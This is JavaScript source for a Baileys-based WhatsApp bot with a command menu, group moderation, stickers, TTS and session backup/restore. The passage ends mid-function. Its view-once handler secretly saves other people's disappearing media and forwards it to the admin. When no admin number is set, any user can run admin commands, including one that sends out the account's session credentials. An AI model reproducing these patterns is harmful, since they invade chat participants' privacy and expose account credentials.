/**
 * ============================================================================
 * WHATSAPP BOT - MAIN LOGIC
 * ============================================================================
 * This file contains all the bot logic, command handling, and state management.
 *
 * STRUCTURE:
 * 1. Imports & Configuration
 * 2. State Management (Paused chats, etc.)
 * 3. Utility Helpers (Admin check, typing indicator, etc.)
 * 4. Session Management (Backup/Restore)
 * 5. Feature Handlers (View-once, Status, Welcome, etc.)
 * 6. Command Handler (The main router for all commands)
 * 7. Main Bot Logic (startBot, stopBot)
 * ============================================================================
 */

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  downloadMediaMessage,
  getContentType
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');

// ============================================================================
// 1. IMPORTS & CONFIGURATION
// ============================================================================

// --- Paths ---
const SESSION_DIR = process.env.SESSION_DIR
  ? path.join(process.env.SESSION_DIR, 'auth')
  : path.join(__dirname, 'sessions', 'auth');

const STATE_FILE = process.env.SESSION_DIR
  ? path.join(process.env.SESSION_DIR, 'state.json')
  : path.join(__dirname, 'sessions', 'state.json');

// --- Admin ---
// Your WhatsApp number (digits only, country code first, no +)
const ADMIN_NUMBER = process.env.ADMIN_NUMBER || '';

// --- Session Duration ---
const SESSION_DURATION_MS = 60 * 60 * 1000; // 1 hour
const PAIRING_TIMEOUT_MS = 5 * 60 * 1000;   // 5 minutes to enter code

// ============================================================================
// 2. STATE MANAGEMENT
// ============================================================================

let sock = null;
let callbacks = {};
let currentNumber = null;
let isStopping = false;
let hasRequestedCode = false;
let botJid = null;

// --- Persisted State ---
let pausedChats = new Set();       // 'ALL' or specific JIDs
let welcomeEnabled = new Set();    // Group JIDs
let goodbyeEnabled = new Set();    // Group JIDs
let viewOnceEnabled = false;
let customWelcome = {};            // { groupJid: "text" }
let autoDownload = false;

// --- Load State from File ---
function loadState() {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const data = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
      pausedChats = new Set(data.pausedChats || []);
      welcomeEnabled = new Set(data.welcomeEnabled || []);
      goodbyeEnabled = new Set(data.goodbyeEnabled || []);
      viewOnceEnabled = data.viewOnceEnabled || false;
      customWelcome = data.customWelcome || {};
      autoDownload = data.autoDownload || false;
      console.log('[State] Loaded.');
    }
  } catch (e) {
    console.error('[State] Load error:', e.message);
  }
}

// --- Save State to File ---
function saveState() {
  try {
    fs.mkdirSync(path.dirname(STATE_FILE), { recursive: true });
    fs.writeFileSync(STATE_FILE, JSON.stringify({
      pausedChats: [...pausedChats],
      welcomeEnabled: [...welcomeEnabled],
      goodbyeEnabled: [...goodbyeEnabled],
      viewOnceEnabled,
      customWelcome,
      autoDownload
    }, null, 2), 'utf8');
  } catch (e) {
    console.error('[State] Save error:', e.message);
  }
}

// ============================================================================
// 3. UTILITY HELPERS
// ============================================================================

/**
 * Check if a JID belongs to the admin.
 * This is the key to allowing the admin to use the bot from their own phone.
 */
function isAdmin(senderJid) {
  if (!ADMIN_NUMBER) return true; // No admin set = dev mode
  const num = (senderJid || '').split('@')[0].split(':')[0];
  return num === ADMIN_NUMBER;
}

function isPaused(jid) {
  return pausedChats.has('ALL') || pausedChats.has(jid);
}

/**
 * Shows a "typing..." indicator while executing a function.
 */
async function withTyping(jid, fn) {
  try {
    await sock.sendPresenceUpdate('composing', jid);
    await fn();
  } finally {
    try { await sock.sendPresenceUpdate('paused', jid); } catch (e) {}
  }
}

/**
 * Shows a "recording..." indicator while executing a function.
 */
async function withRecording(jid, fn) {
  try {
    await sock.sendPresenceUpdate('recording', jid);
    await fn();
  } finally {
    try { await sock.sendPresenceUpdate('paused', jid); } catch (e) {}
  }
}

/**
 * A simple helper to extract text from various message types.
 */
function extractText(msg) {
  const m = msg.message;
  if (!m) return '';
  return (
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    ''
  );
}

// ============================================================================
// 4. SESSION MANAGEMENT
// ============================================================================

/**
 * Bundles all auth files and sends them to the admin as a JSON document.
 */
async function sendSessionBackup(adminJid) {
  try {
    if (!fs.existsSync(SESSION_DIR)) {
      await sock.sendMessage(adminJid, { text: '⚠️ No session files found.' });
      return;
    }
    const files = fs.readdirSync(SESSION_DIR).filter(f => f.endsWith('.json'));
    if (!files.length) {
      await sock.sendMessage(adminJid, { text: '⚠️ No session files yet.' });
      return;
    }
    const bundle = {};
    for (const f of files) {
      bundle[f] = JSON.parse(fs.readFileSync(path.join(SESSION_DIR, f), 'utf8'));
    }
    const buffer = Buffer.from(JSON.stringify(bundle, null, 2));
    await sock.sendMessage(adminJid, {
      document: buffer,
      mimetype: 'application/json',
      fileName: `wa-session-${Date.now()}.json`,
      caption: `🔐 Session Backup\nNumber: +${currentNumber}\nTime: ${new Date().toISOString()}\n\nKeep safe.`
    });
    console.log('[Session] Backup sent to admin.');
  } catch (e) {
    console.error('[Backup] Error:', e.message);
  }
}

/**
 * Restores a session from a downloaded JSON file.
 */
function restoreSessionFromFile(jsonPath) {
  try {
    if (!fs.existsSync(jsonPath)) return false;
    const bundle = JSON.parse(fs.readFileSync(jsonPath, 'utf8'));
    fs.mkdirSync(SESSION_DIR, { recursive: true });
    for (const [filename, content] of Object.entries(bundle)) {
      fs.writeFileSync(path.join(SESSION_DIR, filename), JSON.stringify(content, null, 2), 'utf8');
    }
    console.log('[Session] Restored from file.');
    return true;
  } catch (e) {
    console.error('[Restore] Error:', e.message);
    return false;
  }
}

// ============================================================================
// 5. FEATURE HANDLERS
// ============================================================================

/**
 * Attempts to capture a view-once message and forward it to the admin.
 */
async function tryCaptureViewOnce(msg, from) {
  try {
    const content = msg.message;
    const wrappers = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'];
    let inner = null;
    for (const w of wrappers) {
      if (content?.[w]?.message) { inner = content[w].message; break; }
    }
    if (!inner) return false;

    const mediaType = inner.imageMessage ? 'imageMessage'
      : inner.videoMessage ? 'videoMessage'
      : inner.audioMessage ? 'audioMessage' : null;
    if (!mediaType) return false;

    const fakeMsg = { key: msg.key, message: { [mediaType]: inner[mediaType] } };
    const buffer = await downloadMediaMessage(fakeMsg, 'buffer', {},
      { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });

    if (ADMIN_NUMBER) {
      const adminJid = `${ADMIN_NUMBER}@s.whatsapp.net`;
      const senderNum = (msg.key.participant || from).split('@')[0];
      const caption = `📸 View-Once Captured\nFrom: +${senderNum}\nType: ${mediaType}`;
      if (mediaType === 'imageMessage') {
        await sock.sendMessage(adminJid, { image: buffer, caption });
      } else if (mediaType === 'videoMessage') {
        await sock.sendMessage(adminJid, { video: buffer, caption });
      } else {
        await sock.sendMessage(adminJid, { audio: buffer, mimetype: 'audio/ogg', ptt: true });
      }
    }
    return true;
  } catch (e) {
    console.error('[VO] Error:', e.message);
    return false;
  }
}

/**
 * Posts a quoted message to the user's status.
 */
async function postToStatus(quotedMsg) {
  try {
    const statusJid = 'status@broadcast';
    const content = quotedMsg.message;
    const type = getContentType(content);

    let payload = {};
    if (type === 'conversation' || type === 'extendedTextMessage') {
      payload = { text: content.conversation || content.extendedTextMessage?.text || '', backgroundColor: '#1F2C33', font: 2 };
    } else if (type === 'imageMessage') {
      const buf = await downloadMediaMessage(quotedMsg, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
      payload = { image: buf, caption: content.imageMessage?.caption || '' };
    } else if (type === 'videoMessage') {
      const buf = await downloadMediaMessage(quotedMsg, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
      payload = { video: buf, caption: content.videoMessage?.caption || '' };
    } else {
      return false;
    }

    await sock.sendMessage(statusJid, payload, {
      broadcast: true,
      statusJidList: [] // Empty list, WhatsApp will use your contact list
    });
    return true;
  } catch (e) {
    console.error('[Status] Error:', e.message);
    return false;
  }
}

/**
 * Sends a welcome message to new group members.
 */
async function sendWelcome(groupJid, participants) {
  try {
    const meta = await sock.groupMetadata(groupJid);
    const groupName = meta.subject || 'the group';

    for (const jid of participants) {
      const num = jid.split('@')[0];
      const custom = customWelcome[groupJid];
      const text = custom
        ? custom.replace(/@user/g, `@${num}`).replace(/@group/g, groupName)
        : `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   👋  *WELCOME*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nHello @${num}!\nYou've joined:\n\n╭────────────────────\n│ 📌 *${groupName}*\n╰────────────────────\n\n*Get started:*\n│ Type *.help* to see what I can do\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  _Glad to have you here!_`;

      await sock.sendMessage(groupJid, { text, mentions: [jid] });
    }
  } catch (e) {
    console.error('[Welcome] Error:', e.message);
  }
}

/**
 * Sends a goodbye message when a member leaves.
 */
async function sendGoodbye(groupJid, participants) {
  try {
    const meta = await sock.groupMetadata(groupJid);
    const groupName = meta.subject || 'the group';

    for (const jid of participants) {
      const num = jid.split('@')[0];
      const text = `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   👋  *GOODBYE*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n@${num} has left the group.\n\n╭────────────────────\n│ 📌 *${groupName}*\n╰────────────────────\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  _Wishing you the best!_`;

      await sock.sendMessage(groupJid, { text, mentions: [jid] });
    }
  } catch (e) {
    console.error('[Goodbye] Error:', e.message);
  }
}


// ============================================================================
// 6. COMMAND HANDLER
// ============================================================================

/**
 * This is the main command router. It checks permissions and routes commands
 * to the appropriate logic block.
 * To add a new command:
 * 1. Add it to `publicCmds` or `adminCmds`.
 * 2. Add a new `if (base === '.yourcommand')` block.
 */
async function handleCommand(msg, from, senderJid, rawText) {
  const text = rawText.trim();
  const cmd = text.toLowerCase();
  const parts = cmd.split(' ');
  const base = parts[0];
  const args = parts.slice(1);
  const admin = isAdmin(senderJid);
  const isGroup = from.endsWith('@g.us');

  // --- Permission Checks ---
  const publicCmds = ['.help', '.menu', '.ping', '.id', '.myid', '.time', '.uptime',
    '.sticker', '.s', '.toimg', '.tts', '.voice', '.getpp'];
  const adminCmds = ['.status', '.backup', '.restore', '.logout', '.pause', '.resume', '.pausestatus',
    '.welcome', '.goodbye', '.setwelcome', '.tagall', '.hidetag', '.kick', '.promote', '.demote',
    '.mute', '.unmute', '.groupinfo', '.vo', '.admin', '.restart', '.poststatus', '.autodl'];

  if (adminCmds.includes(base) && !admin) {
    await withTyping(from, () => sock.sendMessage(from, { text: `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   🔒  *ACCESS DENIED*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nSorry, this command is restricted to the admin.` }));
    return;
  }

  // --- Command Blocks ---

  if (base === '.help' || base === '.menu') {
    const help = `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   🤖  *BOT MENU*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  📌  *GENERAL*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ .help      • show menu\n│ .ping      • check alive\n│ .id        • your JID\n│ .myid      • your number\n│ .time      • server time\n│ .uptime    • bot uptime\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  🎨  *MEDIA*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ .sticker   • img → sticker\n│ .toimg     • sticker → img\n│ .tts       • text → voice\n│ .voice     • reply → voice\n│ .getpp     • profile pic\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  👮  *ADMIN ONLY*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ .status    • bot status\n│ .backup    • save session\n│ .restore   • load session\n│ .logout    • disconnect\n│ .restart   • reboot bot\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  ⏸️  *PAUSE CONTROL*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ .pause         • mute here\n│ .resume        • unmute here\n│ .pause all     • mute all\n│ .resume all    • unmute all\n│ .pausestatus   • show state\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  👥  *GROUP CONTROL*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ .welcome on/off\n│ .goodbye on/off\n│ .setwelcome <text>\n│ .tagall <msg>\n│ .hidetag <msg>\n│ .kick @user\n│ .promote @user\n│ .demote @user\n│ .mute / .unmute\n│ .groupinfo\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  📸  *SPECIAL*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ .vo on/off      • view-once\n│ .autodl on/off  • auto DL\n│ .poststatus     • → my status\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  ⚙️  *INFO*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ Admin  : ${ADMIN_NUMBER ? '+' + ADMIN_NUMBER : 'not set'}\n│ Uptime : ${Math.floor(process.uptime() / 60)} min\n│ Prefix : .\n\n╰━━━━━━━━━━━━━━━━━━━━╯\n  _Powered by Baileys_`;
    await withTyping(from, () => sock.sendMessage(from, { text: help }));
    return;
  }

  if (base === '.ping') {
    const start = Date.now();
    await withTyping(from, () => sock.sendMessage(from, { text: `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   🏓  *PONG*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ Status  : ✅ online\n│ Latency : ${Date.now() - start} ms` }));
    return;
  }

  if (base === '.id' || base === '.myid') {
    const num = senderJid.split('@')[0].split(':')[0];
    await withTyping(from, () => sock.sendMessage(from, { text: `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   🆔  *YOUR INFO*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ Number   : +${num}\n│ User JID : ${senderJid}\n│ Chat JID : ${from}` }));
    return;
  }

  if (base === '.time') {
    await withTyping(from, () => sock.sendMessage(from, { text: `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   🕐  *SERVER TIME*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ ${new Date().toUTCString()}` }));
    return;
  }

  if (base === '.uptime') {
    const s = process.uptime();
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60);
    await withTyping(from, () => sock.sendMessage(from, { text: `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ⏱️  *UPTIME*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ Running : ${h}h ${m}m\n│ Status  : ${botJid ? '✅ connected' : '❌ offline'}` }));
    return;
  }

  if (base === '.status') {
    const s = process.uptime();
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60);
    const txt = `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   📊  *BOT STATUS*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  🔌  *CONNECTION*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ Status   : ${botJid ? '✅ online' : '❌ offline'}\n│ Number   : +${currentNumber || 'N/A'}\n│ Uptime   : ${h}h ${m}m\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  ⚙️  *FEATURES*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ Paused     : ${pausedChats.size} chat(s)\n│ View-once  : ${viewOnceEnabled ? '✅ ON' : '❌ OFF'}\n│ Auto-DL    : ${autoDownload ? '✅ ON' : '❌ OFF'}\n│ Welcome    : ${welcomeEnabled.size} group(s)\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  👤  *ADMIN*\n━━━━━━━━━━━━━━━━━━━━━━━\n│ ${ADMIN_NUMBER ? '+' + ADMIN_NUMBER : 'not set'}`;
    await withTyping(from, () => sock.sendMessage(from, { text: txt }));
    return;
  }

  if (base === '.sticker' || base === '.s') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) { await withTyping(from, () => sock.sendMessage(from, { text: '❌ Reply to an image or video.' })); return; }
    const img = quoted.imageMessage, vid = quoted.videoMessage;
    if (!img && !vid) { await withTyping(from, () => sock.sendMessage(from, { text: '❌ Must be image or video.' })); return; }
    try {
      await withTyping(from, async () => {
        const mType = img ? 'imageMessage' : 'videoMessage';
        const mContent = img || vid;
        const fakeMsg = { key: { remoteJid: from, id: msg.message.extendedTextMessage.contextInfo.stanzaId, fromMe: false }, message: { [mType]: mContent } };
        const buf = await downloadMediaMessage(fakeMsg, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
        await sock.sendMessage(from, { sticker: buf });
      });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed. Try a smaller file.' }); }
    return;
  }

  if (base === '.toimg') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const stickerMsg = quoted?.stickerMessage;
    if (!stickerMsg) { await withTyping(from, () => sock.sendMessage(from, { text: '❌ Reply to a sticker.' })); return; }
    try {
      await withTyping(from, async () => {
        const fakeMsg = { key: { remoteJid: from, id: msg.message.extendedTextMessage.contextInfo.stanzaId, fromMe: false }, message: { stickerMessage: stickerMsg } };
        const buf = await downloadMediaMessage(fakeMsg, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
        await sock.sendMessage(from, { image: buf, caption: '🎨 *Converted to image*' });
      });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed.' }); }
    return;
  }

  if (base === '.tts' || base === '.voice') {
    let targetText = args.join(' ');
    if (!targetText) {
      const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
      targetText = quoted?.conversation || quoted?.extendedTextMessage?.text || '';
    }
    if (!targetText) { await withTyping(from, () => sock.sendMessage(from, { text: '❌ Provide text or reply to a message.' })); return; }
    try {
      const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(targetText)}&tl=en&client=tw-ob`;
      const res = await fetch(url);
      const buf = Buffer.from(await res.arrayBuffer());
      if (!buf || buf.length === 0) throw new Error("Empty audio buffer");
      await withRecording(from, () => sock.sendMessage(from, { audio: buf, mimetype: 'audio/mp4', ptt: true }));
    } catch (e) { console.error('[TTS]', e.message); await sock.sendMessage(from, { text: '❌ TTS failed.' }); }
    return;
  }

  if (base === '.getpp') {
    let target = from;
    const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentioned?.length) target = mentioned[0];
    try {
      const url = await sock.profilePictureUrl(target, 'image');
      await sock.sendMessage(from, { image: { url }, caption: '📷 *Profile picture*' });
    } catch (e) { await sock.sendMessage(from, { text: '❌ No profile picture available.' }); }
    return;
  }

  // --- Pause / Resume ---
  if (base === '.pause') {
    if (args[0] === 'all') { pausedChats.add('ALL'); saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ⏸️  *GLOBAL PAUSE*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nBot is now silent everywhere.' }); return; }
    pausedChats.add(from); saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ⏸️  *PAUSED*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nBot is silent in this chat.' }); return;
  }
  if (base === '.resume') {
    if (args[0] === 'all') { pausedChats.delete('ALL'); saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ▶️  *RESUMED*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nBot is active everywhere.' }); return; }
    pausedChats.delete(from); saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ▶️  *RESUMED*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nBot is active in this chat.' }); return;
  }
  if (base === '.pausestatus') {
    const g = pausedChats.has('ALL'), l = pausedChats.has(from);
    const state = g ? '🌍 Global pause ON' : l ? '⏸️ This chat paused' : '▶️ Active';
    await sock.sendMessage(from, { text: `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   📋  *PAUSE STATUS*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ ${state}` }); return;
  }

  // --- Welcome / Goodbye ---
  if (base === '.welcome') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    if (args[0] === 'on') { welcomeEnabled.add(from); saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ✅  *WELCOME ON*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯' }); }
    else if (args[0] === 'off') { welcomeEnabled.delete(from); saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ❌  *WELCOME OFF*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯' }); }
    else await sock.sendMessage(from, { text: 'Usage: .welcome on/off' });
    return;
  }
  if (base === '.goodbye') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    if (args[0] === 'on') { goodbyeEnabled.add(from); saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ✅  *GOODBYE ON*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯' }); }
    else if (args[0] === 'off') { goodbyeEnabled.delete(from); saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ❌  *GOODBYE OFF*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯' }); }
    else await sock.sendMessage(from, { text: 'Usage: .goodbye on/off' });
    return;
  }
  if (base === '.setwelcome') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    const custom = text.replace(/^\.setwelcome\s+/i, '');
    if (!custom) { await sock.sendMessage(from, { text: 'Usage: .setwelcome <text>  (@user, @group)' }); return; }
    customWelcome[from] = custom; saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ✅  *SAVED*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nCustom welcome message set.' }); return;
  }

  // --- Tag / Kick ---
  if (base === '.tagall' || base === '.hidetag') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      const meta = await sock.groupMetadata(from);
      const mentions = meta.participants.map(p => p.id);
      const msgText = args.join(' ') || '📢 Attention everyone!';
      if (base === '.hidetag') { await sock.sendMessage(from, { text: msgText, mentions }); }
      else {
        const list = mentions.map(j => `│ @${j.split('@')[0]}`).join('\n');
        const txt = `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   📢  *ANNOUNCEMENT*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n${msgText}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n${list}\n╰━━━━━━━━━━━━━━━━━━━━╯`;
        await sock.sendMessage(from, { text: txt, mentions });
      }
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed.' }); }
    return;
  }
  if (base === '.kick' || base === '.promote' || base === '.demote') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid;
    if (!mentioned?.length) { await sock.sendMessage(from, { text: `❌ Mention someone to ${base.slice(1)}.` }); return; }
    try {
      const action = base === '.kick' ? 'remove' : base === '.promote' ? 'promote' : 'demote';
      await sock.groupParticipantsUpdate(from, mentioned, action);
      await sock.sendMessage(from, { text: `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ✅  *${action.toUpperCase()}*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯` });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed. Bot must be admin.' }); }
    return;
  }
  if (base === '.mute' || base === '.unmute') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      await sock.groupSettingUpdate(from, base === '.mute' ? 'announcement' : 'not_announcement');
      await sock.sendMessage(from, { text: base === '.mute' ? '🔇 *Group muted*' : '🔊 *Group unmuted*' });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed.' }); }
    return;
  }
  if (base === '.groupinfo') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      const meta = await sock.groupMetadata(from);
      const admins = meta.participants.filter(p => p.admin).map(p => `│ +${p.id.split('@')[0]}`).join('\n');
      const txt = `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   📋  *GROUP INFO*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ Name    : ${meta.subject}\n│ ID      : ${meta.id}\n│ Members : ${meta.participants.length}\n│ Admins  : ${meta.participants.filter(p => p.admin).length}\n│ Created : ${new Date(meta.creation * 1000).toUTCString().split(',')[0]}\n\n━━━━━━━━━━━━━━━━━━━━━━━\n  👑  *ADMINS*\n━━━━━━━━━━━━━━━━━━━━━━━\n${admins}`;
      await sock.sendMessage(from, { text: txt });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed.' }); }
    return;
  }

  // --- Special ---
  if (base === '.vo') {
    if (args[0] === 'on') { viewOnceEnabled = true; saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   📸  *VO CAPTURE*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ Status : ✅ ON' }); }
    else if (args[0] === 'off') { viewOnceEnabled = false; saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   📸  *VO CAPTURE*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ Status : ❌ OFF' }); }
    else await sock.sendMessage(from, { text: 'Usage: .vo on/off' });
    return;
  }
  if (base === '.autodl') {
    if (args[0] === 'on') { autoDownload = true; saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ⬇️  *AUTO-DOWNLOAD*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ Status : ✅ ON' }); }
    else if (args[0] === 'off') { autoDownload = false; saveState(); await sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ⬇️  *AUTO-DOWNLOAD*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\n│ Status : ❌ OFF' }); }
    else await sock.sendMessage(from, { text: 'Usage: .autodl on/off' });
    return;
  }
  if (base === '.poststatus') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const quotedKey = msg.message.extendedTextMessage?.contextInfo;
    if (!quoted || !quotedKey) {
      await withTyping(from, () => sock.sendMessage(from, { text: `╭━━━━━━━━━━━━━━━━━━━━╮\n┃   📤  *POST STATUS*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nReply to a message with *.poststatus* to publish it to your WhatsApp status.` }));
      return;
    }
    try {
      const fakeQuoted = { key: { remoteJid: from, id: quotedKey.stanzaId, fromMe: quotedKey.participant === botJid, participant: quotedKey.participant }, message: quoted };
      const ok = await postToStatus(fakeQuoted);
      if (ok) { await withTyping(from, () => sock.sendMessage(from, { text: '╭━━━━━━━━━━━━━━━━━━━━╮\n┃   ✅  *POSTED*   ┃\n╰━━━━━━━━━━━━━━━━━━━━╯\n\nVisible on your status for the next 24 hours.' })); }
      else { await withTyping(from, () => sock.sendMessage(from, { text: '❌ Only text, images, videos supported.' })); }
    } catch (e) { console.error('[Status]', e); await sock.sendMessage(from, { text: '❌ Status post failed.' }); }
    return;
  }
  if (base === '.backup') { await withTyping(from, () => sendSessionBackup(from)); return; }
  if (base === '.restore') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const doc = quoted?.documentMessage;
    if (!doc || !doc.fileName?.endsWith('.json')) { await sock.sendMessage(from, { text: '❌ Reply to a .json session file.' }); return; }
    try {
      const fakeMsg = { key: { remoteJid: from, id: msg.message.extendedTextMessage.contextInfo.stanzaId, fromMe: false }, message: { documentMessage: doc } };
      const buf = await downloadMediaMessage(fakeMsg, 'buffer', {}, { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
      const tmp = path.join(require('os').tmpdir(), `restore-${Date.now()}.json`);
      fs.writeFileSync(tmp, buf);
      const ok = restoreSessionFromFile(tmp);
      fs.unlinkSync(tmp);
      await sock.sendMessage(from, { text: ok ? '✅ *Session restored. Restart bot.*' : '❌ *Restore failed.*' });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Restore error.' }); }
    return;
  }
  if (base === '.logout') {
    await sock.sendMessage(from, { text: '🚪 *Logging out...*' });
    try { await sock.logout(); } catch (e) {}
    stopBot(); return;
  }
  if (base === '.restart') {
    await sock.sendMessage(from, { text: '🔄 *Restarting...*' });
    stopBot();
    setTimeout(() => startBot(currentNumber, callbacks), 2000);
    return;
  }
}


// ============================================================================
// 7. MAIN BOT LOGIC
// ============================================================================

async function startBot(phoneNumber, cbs) {
  callbacks = cbs || {};
  currentNumber = phoneNumber;
  isStopping = false;
  hasRequestedCode = false;

  loadState();
  fs.mkdirSync(SESSION_DIR, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
  const { version } = await fetchLatestBaileysVersion();
  const logger = pino({ level: 'silent' });

  sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger)
    },
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    generateHighQualityLinkPreview: true,
    syncFullHistory: false,
    markOnlineOnConnect: false,
    connectTimeoutMs: 60000,
    keepAliveIntervalMs: 30000,
    retryRequestDelayMs: 250
  });

  sock.ev.on('creds.update', saveCreds);

  // ===== CONNECTION =====
